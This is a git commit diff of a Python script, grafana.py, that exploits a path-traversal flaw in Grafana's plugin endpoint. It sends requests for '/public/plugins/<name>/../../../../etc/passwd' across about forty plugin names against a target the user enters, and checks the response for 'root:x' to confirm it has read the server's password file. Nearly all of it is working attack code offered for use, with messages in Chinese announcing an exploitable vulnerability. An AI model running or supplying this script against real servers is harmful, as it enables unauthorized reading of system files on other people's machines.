0d49e0c22596be8a2ead242f8bfb299f86b07041
captain_686 <53248484+captain686@users.noreply.github.com>
2021-12-09 11:43:12 +0800

    Update grafana.py

--- grafana.py
+++ grafana.py
@@ -1,25 +1,70 @@
-import requests
-import urllib3
-from urllib3.exceptions import InsecureRequestWarning
-urllib3.disable_warnings()
+import urllib.request
 
 
-
-def run(target):
-    plugin_ids = ["alertlist"," annolist"," barchart"," bargauge"," candlestick"," cloudwatch"," dashlist"," elasticsearch"," gauge"," geomap"," gettingstarted"," grafana-azure-monitor-datasource"," graph"," heatmap"," histogram"," influxdb"," jaeger"," logs"," loki"," mssql"," mysql"," news"," nodeGraph"," opentsdb"," piechart"," pluginlist"," postgres"," prometheus"," stackdriver"," stat"," state-timeline"," status-history"," table"," table-old"," tempo"," testdata"," text"," timeseries"," welcome"," zipkin"]
-    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36"}
-    for i in plugin_ids:
-        url = f"{target}/public/plugins/{i}/../../../../../../../../../../../../../../../../../../../etc/passwd"
+def run(url):
+    plugin_list = [
+        '/public/plugins/alertlist/../../../../../../../../etc/passwd',
+        '/public/plugins/annolist/../../../../../../../../etc/passwd',
+        '/public/plugins/barchart/../../../../../../../../etc/passwd',
+        '/public/plugins/cloudwatch/../../../../../../../../etc/passwd',
+        '/public/plugins/dashlist/../../../../../../../../etc/passwd',
+        '/public/plugins/elasticsearch/../../../../../../../../etc/passwd',
+        '/public/plugins/graph/../../../../../../../../etc/passwd',
+        '/public/plugins/graphite/../../../../../../../../etc/passwd',
+        '/public/plugins/heatmap/../../../../../../../../etc/passwd',
+        '/public/plugins/influxdb/../../../../../../../../etc/passwd',
+        '/public/plugins/mysql/../../../../../../../../etc/passwd',
+        '/public/plugins/opentsdb/../../../../../../../../etc/passwd',
+        '/public/plugins/pluginlist/../../../../../../../../etc/passwd',
+        '/public/plugins/postgres/../../../../../../../../etc/passwd',
+        '/public/plugins/prometheus/../../../../../../../../etc/passwd',
+        '/public/plugins/stackdriver/../../../../../../../../etc/passwd',
+        '/public/plugins/table/../../../../../../../../etc/passwd',
+        '/public/plugins/text/../../../../../../../../etc/passwd',
+        '/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd',
+        '/public/plugins/bargauge/../../../../../../../../etc/passwd',
+        '/public/plugins/gauge/../../../../../../../../etc/passwd',
+        '/public/plugins/geomap/../../../../../../../../etc/passwd',
+        '/public/plugins/gettingstarted/../../../../../../../../etc/passwd',
+        '/public/plugins/histogram/../../../../../../../../etc/passwd',
+        '/public/plugins/jaeger/../../../../../../../../etc/passwd',
+        '/public/plugins/logs/../../../../../../../../etc/passwd',
+        '/public/plugins/loki/../../../../../../../../etc/passwd',
+        '/public/plugins/mssql/../../../../../../../../etc/passwd',
+        '/public/plugins/news/../../../../../../../../etc/passwd',
+        '/public/plugins/nodeGraph/../../../../../../../../etc/passwd',
+        '/public/plugins/piechart/../../../../../../../../etc/passwd',
+        '/public/plugins/stat/../../../../../../../../etc/passwd',
+        '/public/plugins/state-timeline/../../../../../../../../etc/passwd',
+        '/public/plugins/status-history/../../../../../../../../etc/passwd',
+        '/public/plugins/table-old/../../../../../../../../etc/passwd',
+        '/public/plugins/tempo/../../../../../../../../etc/passwd',
+        '/public/plugins/testdata/../../../../../../../../etc/passwd',
+        '/public/plugins/timeseries/../../../../../../../../etc/passwd',
+        '/public/plugins/welcome/../../../../../../../../etc/passwd',
+        '/public/plugins/zipkin/../../../../../../../../etc/passwd',
+    ]
+    headers = {"User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1"}
+    for plugin_path in plugin_list:
+        paylaod = url + plugin_path
         try:
-            res = requests.get(url, headers=headers ,timeout=5)
-            if res.status_code == 200 and res.text:
-                print(target+"存在漏洞,漏洞URL："+url)
-                print(res.text)
+            re = urllib.request.Request(url=paylaod, headers=headers)
+            res = urllib.request.urlopen(re, timeout=3)
+            code = res.getcode()
+            context = res.read()
+            # print("payload：" + paylaod)
+            if "root:x" in context.decode('utf-8') and code == 200:
+                print("发现漏洞可以利用：")
+                print("payload：" + paylaod)
+                print("回显：" + context.decode('utf-8')[:32])
+                print(url)
                 return True
         except:
             return False
     return False
 
-if __name__ == "__main__":
-    target = input("Target >>> ")
+
+if __name__ == '__main__':
+    target = input("target >>> ")
+    print(target)
     run(target)
